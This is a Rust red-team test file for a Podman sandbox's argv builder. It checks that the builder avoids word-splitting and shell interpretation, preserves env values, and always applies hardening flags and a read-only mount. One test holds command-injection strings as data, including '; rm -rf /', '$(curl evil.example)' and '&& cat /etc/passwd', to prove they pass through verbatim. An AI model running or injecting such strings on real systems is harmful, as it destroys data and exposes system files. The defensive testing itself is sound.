//! Red-team integration tests for `PodmanSandbox::build_argv`.
//!
//! The argv shape determines whether the sandbox's hardening
//! actually applies. These tests pin invariants that must hold
//! regardless of attacker-controlled inputs supplied via
//! `SandboxCommand`:
//!
//! - `program` containing whitespace must NOT split into multiple
//!   argv elements (no shell, no word-splitting).
//! - `args` containing semicolons / backticks / `$()` must NOT be
//!   interpreted as shell metacharacters (we exec, not shell-out).
//! - Env values containing `=` must roundtrip — the variable
//!   identity carries `=name=value` semantically.
//! - The `--read-only` and `--network=none` flags must always be
//!   present, even when the caller passes minimal env / args.
//!
//! What's NOT covered here: actual container escape from inside a
//! running podman process. That requires a live podman daemon and
//! adversarial linter binaries — out of scope for unit tests; see
//! the deploy harness's red-team suite (referenced in ADR-0002).

use ar_sandbox::{PodmanSandbox, PodmanSandboxConfig, SandboxCommand};
use std::path::PathBuf;

fn cmd_with(program: &str, args: Vec<String>, env: Vec<(String, String)>) -> SandboxCommand {
    SandboxCommand {
        program: program.into(),
        args,
        working_dir: PathBuf::from("/host/repo"),
        env,
    }
}

#[test]
fn program_containing_spaces_is_one_argv_element() {
    let sb = PodmanSandbox::new(PodmanSandboxConfig::default());
    let cmd = cmd_with("evil program with spaces", vec![], vec![]);
    let argv = sb.build_argv(&cmd);
    // The program string must appear verbatim as a single argv
    // element after the image; no word-splitting.
    let image_pos = argv
        .iter()
        .position(|a| a == "ghcr.io/auto-review/sandbox:latest")
        .expect("image present");
    assert_eq!(
        argv.get(image_pos + 1).map(String::as_str),
        Some("evil program with spaces")
    );
}

#[test]
fn args_containing_shell_metachars_are_passed_verbatim() {
    let sb = PodmanSandbox::new(PodmanSandboxConfig::default());
    let cmd = cmd_with(
        "ruff",
        vec![
            "; rm -rf /".into(),
            "$(curl evil.example)".into(),
            "`whoami`".into(),
            "&& cat /etc/passwd".into(),
        ],
        vec![],
    );
    let argv = sb.build_argv(&cmd);
    // None of these strings should be split or interpreted; they
    // appear in argv verbatim. podman's exec treats them as
    // execve() args, not shell input.
    for s in [
        "; rm -rf /",
        "$(curl evil.example)",
        "`whoami`",
        "&& cat /etc/passwd",
    ] {
        assert!(
            argv.iter().any(|a| a == s),
            "expected verbatim argv element {s:?}, got {argv:?}"
        );
    }
}

#[test]
fn env_value_with_embedded_equals_roundtrips() {
    let sb = PodmanSandbox::new(PodmanSandboxConfig::default());
    let cmd = cmd_with(
        "ruff",
        vec![],
        vec![("RULES".into(), "key=val=more=signs".into())],
    );
    let argv = sb.build_argv(&cmd);
    // The `-e KEY=VALUE` pair must preserve every `=` in the value.
    assert!(
        argv.iter().any(|a| a == "RULES=key=val=more=signs"),
        "env value with embedded `=` lost a token: {argv:?}"
    );
}

#[test]
fn hardening_flags_present_even_with_minimal_command() {
    let sb = PodmanSandbox::new(PodmanSandboxConfig::default());
    let cmd = cmd_with("/usr/bin/true", vec![], vec![]);
    let argv = sb.build_argv(&cmd);
    for required in [
        "--rm",
        "--network=none",
        "--read-only",
        "--security-opt=no-new-privileges",
        "--cap-drop=ALL",
        "--user",
    ] {
        assert!(
            argv.iter().any(|a| a == required),
            "hardening flag {required} missing from argv {argv:?}",
        );
    }
}

#[test]
fn working_dir_is_mounted_read_only_regardless_of_path_quirks() {
    let sb = PodmanSandbox::new(PodmanSandboxConfig::default());
    // Even with a path that contains spaces or unusual chars, the
    // mount expression must end in `:ro`.
    let cmd = SandboxCommand {
        program: "ruff".into(),
        args: vec![],
        working_dir: PathBuf::from("/var/lib/auto review/clones/abc"),
        env: vec![],
    };
    let argv = sb.build_argv(&cmd);
    let mount_pos = argv.iter().position(|a| a == "-v").expect("-v");
    let mount_arg = argv.get(mount_pos + 1).expect("argument after -v").as_str();
    assert!(
        mount_arg.ends_with(":/work:ro"),
        "mount arg must end with :/work:ro, got {mount_arg:?}",
    );
}
